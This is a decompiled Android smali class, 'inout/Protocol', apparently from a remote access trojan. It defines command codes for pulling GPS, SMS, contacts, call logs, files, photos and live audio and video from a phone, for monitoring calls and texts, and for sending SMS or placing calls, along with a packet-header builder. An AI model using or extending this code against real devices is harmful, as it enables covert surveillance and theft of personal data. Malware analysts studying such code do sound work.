.class public Linout/Protocol;
.super Ljava/lang/Object;
.source "Protocol.java"


# static fields
.field public static final ACK_GIVE_CALL:S

.field public static final ACK_SEND_SMS:S

.field public static final ACK_TOAST:S

.field public static final ALL_DONE:I = 0x3

.field public static final ARG_STREAM_AUDIO_DOWN_CALL:I = 0x3

.field public static final ARG_STREAM_AUDIO_MIC:I = 0x1

.field public static final ARG_STREAM_AUDIO_UPDOWN_CALL:I = 0x4

.field public static final ARG_STREAM_AUDIO_UP_CALL:I = 0x2

.field public static final CONNECT:S = 0x2s

.field public static final DATA_BASIC_INFO:S

.field public static final DATA_CALL_LOGS:S

.field public static final DATA_CONTACTS:S

.field public static final DATA_FILE:S

.field public static final DATA_GPS:S

.field public static final DATA_GPS_STREAM:S

.field public static final DATA_LIST_DIR:S

.field public static final DATA_MONITOR_CALL:S

.field public static final DATA_MONITOR_SMS:S

.field public static final DATA_PICTURE:S

.field public static final DATA_SMS:S

.field public static final DATA_SOUND_STREAM:S

.field public static final DATA_VIDEO_STREAM:S

.field public static final DEBUG:S = 0x0s

.field public static final DISCONNECT:S = 0x5s

.field public static final DO_TOAST:S

.field public static final DO_VIBRATE:S

.field public static final ENVOI_CMD:S = 0x3s

.field public static final ERROR:S = 0x1s

.field public static final GET_ADV_INFORMATIONS:S

.field public static final GET_BASIC_INFO:S

.field public static final GET_CALL_LOGS:S

.field public static final GET_CONTACTS:S

.field public static final GET_FILE:S

.field public static final GET_GPS:S

.field public static final GET_GPS_STREAM:S

.field public static final GET_PICTURE:S

.field public static final GET_PREFERENCE:S = 0x15s

.field public static final GET_SMS:S

.field public static final GET_SOUND_STREAM:S

.field public static final GET_VIDEO_STREAM:S

.field public static final GIVE_CALL:S

.field public static final HEADER_LENGTH_DATA:I = 0xf

.field public static final INFOS:S = 0x4s

.field public static final KEY_SEND_SMS_BODY:Ljava/lang/String; = "body"

.field public static final KEY_SEND_SMS_NUMBER:Ljava/lang/String; = "number"

.field public static final LIST_DIR:S

.field public static final MAX_PACKET_SIZE:I = 0x800

.field public static final MONITOR_CALL:S

.field public static final MONITOR_SMS:S

.field public static final NO_MORE:I = 0x1

.field public static final OPEN_BROWSER:S

.field public static final PACKET_DONE:I = 0x4

.field public static final PACKET_LOST:I = 0x0

.field private static P_INST:S = 0x0s

.field private static P_REP:S = 0x0s

.field public static final SEND_SMS:S

.field public static final SET_PREFERENCE:S = 0x14s

.field public static final SIZE_ERROR:I = 0x2

.field public static final STOP_GPS_STREAM:S

.field public static final STOP_MONITOR_CALL:S

.field public static final STOP_MONITOR_SMS:S

.field public static final STOP_SOUND_STREAM:S

.field public static final STOP_VIDEO_STREAM:S


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 30
    const/16 v0, 0x64

    sput-short v0, Linout/Protocol;->P_INST:S

    .line 31
    sget-short v0, Linout/Protocol;->P_INST:S

    add-int/lit8 v0, v0, 0x0

    int-to-short v0, v0

    sput-short v0, Linout/Protocol;->GET_GPS:S

    .line 32
    sget-short v0, Linout/Protocol;->P_INST:S

    add-int/lit8 v0, v0, 0x1

    int-to-short v0, v0

    sput-short v0, Linout/Protocol;->GET_GPS_STREAM:S

    .line 33
    sget-short v0, Linout/Protocol;->P_INST:S

    add-int/lit8 v0, v0, 0x2

    int-to-short v0, v0

    sput-short v0, Linout/Protocol;->STOP_GPS_STREAM:S

    .line 35
    sget-short v0, Linout/Protocol;->P_INST:S

    add-int/lit8 v0, v0, 0x3

    int-to-short v0, v0

    sput-short v0, Linout/Protocol;->GET_PICTURE:S

    .line 37
    sget-short v0, Linout/Protocol;->P_INST:S

    add-int/lit8 v0, v0, 0x4

    int-to-short v0, v0

    sput-short v0, Linout/Protocol;->GET_SOUND_STREAM:S

    .line 38
    sget-short v0, Linout/Protocol;->P_INST:S

    add-int/lit8 v0, v0, 0x5

    int-to-short v0, v0

    sput-short v0, Linout/Protocol;->STOP_SOUND_STREAM:S

    .line 40
    sget-short v0, Linout/Protocol;->P_INST:S

    add-int/lit8 v0, v0, 0x6

    int-to-short v0, v0

    sput-short v0, Linout/Protocol;->GET_VIDEO_STREAM:S

    .line 41
    sget-short v0, Linout/Protocol;->P_INST:S

    add-int/lit8 v0, v0, 0x7

    int-to-short v0, v0

    sput-short v0, Linout/Protocol;->STOP_VIDEO_STREAM:S

    .line 43
    sget-short v0, Linout/Protocol;->P_INST:S

    add-int/lit8 v0, v0, 0x8

    int-to-short v0, v0

    sput-short v0, Linout/Protocol;->GET_BASIC_INFO:S

    .line 44
    sget-short v0, Linout/Protocol;->P_INST:S

    add-int/lit8 v0, v0, 0x9

    int-to-short v0, v0

    sput-short v0, Linout/Protocol;->DO_TOAST:S

    .line 45
    sget-short v0, Linout/Protocol;->P_INST:S

    add-int/lit8 v0, v0, 0xa

    int-to-short v0, v0

    sput-short v0, Linout/Protocol;->MONITOR_SMS:S

    .line 46
    sget-short v0, Linout/Protocol;->P_INST:S

    add-int/lit8 v0, v0, 0xb

    int-to-short v0, v0

    sput-short v0, Linout/Protocol;->MONITOR_CALL:S

    .line 47
    sget-short v0, Linout/Protocol;->P_INST:S

    add-int/lit8 v0, v0, 0xc

    int-to-short v0, v0

    sput-short v0, Linout/Protocol;->GET_CONTACTS:S

    .line 48
    sget-short v0, Linout/Protocol;->P_INST:S

    add-int/lit8 v0, v0, 0xd

    int-to-short v0, v0

    sput-short v0, Linout/Protocol;->GET_SMS:S

    .line 49
    sget-short v0, Linout/Protocol;->P_INST:S

    add-int/lit8 v0, v0, 0xe

    int-to-short v0, v0

    sput-short v0, Linout/Protocol;->LIST_DIR:S

    .line 50
    sget-short v0, Linout/Protocol;->P_INST:S

    add-int/lit8 v0, v0, 0xf

    int-to-short v0, v0

    sput-short v0, Linout/Protocol;->GET_FILE:S

    .line 51
    sget-short v0, Linout/Protocol;->P_INST:S

    add-int/lit8 v0, v0, 0x10

    int-to-short v0, v0

    sput-short v0, Linout/Protocol;->GIVE_CALL:S

    .line 52
    sget-short v0, Linout/Protocol;->P_INST:S

    add-int/lit8 v0, v0, 0x11

    int-to-short v0, v0

    sput-short v0, Linout/Protocol;->SEND_SMS:S

    .line 53
    sget-short v0, Linout/Protocol;->P_INST:S

    add-int/lit8 v0, v0, 0x12

    int-to-short v0, v0

    sput-short v0, Linout/Protocol;->GET_CALL_LOGS:S

    .line 54
    sget-short v0, Linout/Protocol;->P_INST:S

    add-int/lit8 v0, v0, 0x13

    int-to-short v0, v0

    sput-short v0, Linout/Protocol;->STOP_MONITOR_SMS:S

    .line 55
    sget-short v0, Linout/Protocol;->P_INST:S

    add-int/lit8 v0, v0, 0x14

    int-to-short v0, v0

    sput-short v0, Linout/Protocol;->STOP_MONITOR_CALL:S

    .line 56
    sget-short v0, Linout/Protocol;->P_INST:S

    add-int/lit8 v0, v0, 0x15

    int-to-short v0, v0

    sput-short v0, Linout/Protocol;->GET_ADV_INFORMATIONS:S

    .line 57
    sget-short v0, Linout/Protocol;->P_INST:S

    add-int/lit8 v0, v0, 0x16

    int-to-short v0, v0

    sput-short v0, Linout/Protocol;->OPEN_BROWSER:S

    .line 58
    sget-short v0, Linout/Protocol;->P_INST:S

    add-int/lit8 v0, v0, 0x17

    int-to-short v0, v0

    sput-short v0, Linout/Protocol;->DO_VIBRATE:S

    .line 62
    const/16 v0, 0xc8

    sput-short v0, Linout/Protocol;->P_REP:S

    .line 63
    sget-short v0, Linout/Protocol;->P_REP:S

    add-int/lit8 v0, v0, 0x0

    int-to-short v0, v0

    sput-short v0, Linout/Protocol;->DATA_GPS:S

    .line 64
    sget-short v0, Linout/Protocol;->P_REP:S

    add-int/lit8 v0, v0, 0x1

    int-to-short v0, v0

    sput-short v0, Linout/Protocol;->DATA_GPS_STREAM:S

    .line 65
    sget-short v0, Linout/Protocol;->P_REP:S

    add-int/lit8 v0, v0, 0x2

    int-to-short v0, v0

    sput-short v0, Linout/Protocol;->DATA_PICTURE:S

    .line 66
    sget-short v0, Linout/Protocol;->P_REP:S

    add-int/lit8 v0, v0, 0x3

    int-to-short v0, v0

    sput-short v0, Linout/Protocol;->DATA_SOUND_STREAM:S

    .line 67
    sget-short v0, Linout/Protocol;->P_REP:S

    add-int/lit8 v0, v0, 0x4

    int-to-short v0, v0

    sput-short v0, Linout/Protocol;->DATA_VIDEO_STREAM:S

    .line 68
    sget-short v0, Linout/Protocol;->P_REP:S

    add-int/lit8 v0, v0, 0x5

    int-to-short v0, v0

    sput-short v0, Linout/Protocol;->DATA_BASIC_INFO:S

    .line 69
    sget-short v0, Linout/Protocol;->P_REP:S

    add-int/lit8 v0, v0, 0x6

    int-to-short v0, v0

    sput-short v0, Linout/Protocol;->ACK_TOAST:S

    .line 70
    sget-short v0, Linout/Protocol;->P_REP:S

    add-int/lit8 v0, v0, 0x7

    int-to-short v0, v0

    sput-short v0, Linout/Protocol;->DATA_MONITOR_SMS:S

    .line 71
    sget-short v0, Linout/Protocol;->P_REP:S

    add-int/lit8 v0, v0, 0x8

    int-to-short v0, v0

    sput-short v0, Linout/Protocol;->DATA_MONITOR_CALL:S

    .line 72
    sget-short v0, Linout/Protocol;->P_REP:S

    add-int/lit8 v0, v0, 0x9

    int-to-short v0, v0

    sput-short v0, Linout/Protocol;->DATA_CONTACTS:S

    .line 73
    sget-short v0, Linout/Protocol;->P_REP:S

    add-int/lit8 v0, v0, 0xa

    int-to-short v0, v0

    sput-short v0, Linout/Protocol;->DATA_SMS:S

    .line 74
    sget-short v0, Linout/Protocol;->P_REP:S

    add-int/lit8 v0, v0, 0xb

    int-to-short v0, v0

    sput-short v0, Linout/Protocol;->DATA_LIST_DIR:S

    .line 75
    sget-short v0, Linout/Protocol;->P_REP:S

    add-int/lit8 v0, v0, 0xc

    int-to-short v0, v0

    sput-short v0, Linout/Protocol;->DATA_FILE:S

    .line 76
    sget-short v0, Linout/Protocol;->P_REP:S

    add-int/lit8 v0, v0, 0xd

    int-to-short v0, v0

    sput-short v0, Linout/Protocol;->ACK_GIVE_CALL:S

    .line 77
    sget-short v0, Linout/Protocol;->P_REP:S

    add-int/lit8 v0, v0, 0xe

    int-to-short v0, v0

    sput-short v0, Linout/Protocol;->ACK_SEND_SMS:S

    .line 78
    sget-short v0, Linout/Protocol;->P_REP:S

    add-int/lit8 v0, v0, 0xf

    int-to-short v0, v0

    sput-short v0, Linout/Protocol;->DATA_CALL_LOGS:S

    .line 5
    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .prologue
    .line 5
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static dataHeaderGenerator(IIZSI)[B
    .locals 10
    .param p0, "totalLenght"    # I
    .param p1, "localLength"    # I
    .param p2, "moreF"    # Z
    .param p3, "idPaquet"    # S
    .param p4, "channel"    # I

    .prologue
    const/4 v9, 0x1

    const/4 v7, 0x4

    const/4 v8, 0x0

    .line 92
    invoke-static {v7}, Ljava/nio/ByteBuffer;->allocate(I)Ljava/nio/ByteBuffer;

    move-result-object v6

    invoke-virtual {v6, p0}, Ljava/nio/ByteBuffer;->putInt(I)Ljava/nio/ByteBuffer;

    move-result-object v6

    invoke-virtual {v6}, Ljava/nio/ByteBuffer;->array()[B

    move-result-object v4

    .line 93
    .local v4, "byteTotalLength":[B
    invoke-static {v7}, Ljava/nio/ByteBuffer;->allocate(I)Ljava/nio/ByteBuffer;

    move-result-object v6

    invoke-virtual {v6, p1}, Ljava/nio/ByteBuffer;->putInt(I)Ljava/nio/ByteBuffer;

    move-result-object v6

    invoke-virtual {v6}, Ljava/nio/ByteBuffer;->array()[B

    move-result-object v1

    .line 94
    .local v1, "byteLocalLength":[B
    new-array v2, v9, [B

    .line 95
    .local v2, "byteMoreF":[B
    if-eqz p2, :cond_0

    aput-byte v9, v2, v8

    .line 97
    :goto_0
    const/4 v6, 0x2

    invoke-static {v6}, Ljava/nio/ByteBuffer;->allocate(I)Ljava/nio/ByteBuffer;

    move-result-object v6

    invoke-virtual {v6, p3}, Ljava/nio/ByteBuffer;->putShort(S)Ljava/nio/ByteBuffer;

    move-result-object v6

    invoke-virtual {v6}, Ljava/nio/ByteBuffer;->array()[B

    move-result-object v3

    .line 98
    .local v3, "bytePointeurData":[B
    invoke-static {v7}, Ljava/nio/ByteBuffer;->allocate(I)Ljava/nio/ByteBuffer;

    move-result-object v6

    invoke-virtual {v6, p4}, Ljava/nio/ByteBuffer;->putInt(I)Ljava/nio/ByteBuffer;

    move-result-object v6

    invoke-virtual {v6}, Ljava/nio/ByteBuffer;->array()[B

    move-result-object v0

    .line 100
    .local v0, "byteChannel":[B
    const/16 v6, 0xf

    new-array v5, v6, [B

    .line 102
    .local v5, "header":[B
    array-length v6, v4

    invoke-static {v4, v8, v5, v8, v6}, Ljava/lang/System;->arraycopy(Ljava/lang/Object;ILjava/lang/Object;II)V

    .line 103
    array-length v6, v4

    array-length v7, v1

    invoke-static {v1, v8, v5, v6, v7}, Ljava/lang/System;->arraycopy(Ljava/lang/Object;ILjava/lang/Object;II)V

    .line 104
    array-length v6, v4

    array-length v7, v1

    add-int/2addr v6, v7

    array-length v7, v2

    invoke-static {v2, v8, v5, v6, v7}, Ljava/lang/System;->arraycopy(Ljava/lang/Object;ILjava/lang/Object;II)V

    .line 105
    array-length v6, v4

    array-length v7, v1

    add-int/2addr v6, v7

    array-length v7, v2

    add-int/2addr v6, v7

    array-length v7, v3

    invoke-static {v3, v8, v5, v6, v7}, Ljava/lang/System;->arraycopy(Ljava/lang/Object;ILjava/lang/Object;II)V

    .line 106
    array-length v6, v4

    array-length v7, v1

    add-int/2addr v6, v7

    array-length v7, v2

    add-int/2addr v6, v7

    array-length v7, v3

    add-int/2addr v6, v7

    array-length v7, v0

    invoke-static {v0, v8, v5, v6, v7}, Ljava/lang/System;->arraycopy(Ljava/lang/Object;ILjava/lang/Object;II)V

    .line 108
    return-object v5

    .line 96
    .end local v0    # "byteChannel":[B
    .end local v3    # "bytePointeurData":[B
    .end local v5    # "header":[B
    :cond_0
    aput-byte v8, v2, v8

    goto :goto_0
.end method
